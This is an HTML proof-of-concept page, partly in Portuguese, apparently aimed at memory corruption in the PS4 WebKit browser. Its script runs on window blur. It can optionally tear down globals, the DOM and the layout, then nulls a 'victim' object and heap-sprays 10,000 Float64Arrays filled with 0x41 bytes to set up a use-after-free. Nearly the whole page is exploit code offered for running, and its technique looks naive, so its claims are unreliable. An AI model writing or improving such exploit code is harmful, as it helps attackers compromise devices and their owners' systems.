
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC CE-36329-3 (Auditoria de Teardown)</title>
</head>
<body>

<h1>PS4 WebKit Memory Corruption PoC</h1>

<div id="msg">
    INSTRUÇÕES:<br><br>
    1. Selecione os testes desejados.<br>
    2. Clique em RUN TEST.<br>
    3. Pressione OPTIONS.<br>
    4. Selecione REFRESH.
</div>

<hr>

<h3>Mini-Teardowns (executados no BLUR)</h3>

<label><input type="checkbox" id="t_js"> JS World Kill</label><br>
<label><input type="checkbox" id="t_loop"> Abort Event Loop</label><br>
<label><input type="checkbox" id="t_dom"> DOM Tree Destruction</label><br>
<label><input type="checkbox" id="t_fs"> Exit Fullscreen</label><br>
<label><input type="checkbox" id="t_layout"> Layout / Render Reset</label><br>

<hr>

<button onclick="fire()">RUN TEST</button>

<pre id="log"></pre>

<script>
const log = msg => document.getElementById("log").textContent += msg + "\n";

let spray_storage = [];
let victim = {
    id: "VICTIM_OBJECT",
    data: new Array(100).fill(1.1),
    ptr: { a: 1 }
};

function fire() {
    log("[*] Test started");

    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();

    window.onblur = function () {
        log("[!] BLUR detected");

        /* =======================
           MINI-TEARDOWNS
           ======================= */

        if (t_js.checked) {
            log("[T] JS World Kill");
            for (let k in window) {
                try { window[k] = null; } catch(e) {}
            }
        }

        if (t_loop.checked) {
            log("[T] Abort Event Loop");
            let stop = true;
            Promise.resolve().then(() => { if (!stop) {} });
            stop = false;
        }

        if (t_dom.checked) {
            log("[T] DOM Tree Destruction");
            try {
                document.body.innerHTML = "";
                document.head.innerHTML = "";
            } catch(e) {}
        }

        if (t_fs.checked) {
            log("[T] Exit Fullscreen");
            try {
                if (document.exitFullscreen) document.exitFullscreen();
            } catch(e) {}
        }

        if (t_layout.checked) {
            log("[T] Layout / Render Reset");
            try {
                document.documentElement.style.display = "none";
            } catch(e) {}
        }

        /* =======================
           PoC ORIGINAL (INALTERADA)
           ======================= */

        log("[*] Free victim");
        victim = null;

        log("[*] Spray Float64Array");
        try {
            for (let i = 0; i < 10000; i++) {
                const poison = new Float64Array(32);
                poison.fill(2.121995791e-314); // 0x4141414141414141
                spray_storage.push(poison);
            }
        } catch(e) {}

        window.exploit_trigger = spray_storage;

        log("[*] Ready — now REFRESH via Options");
    };
}
</script>

</body>
</html>
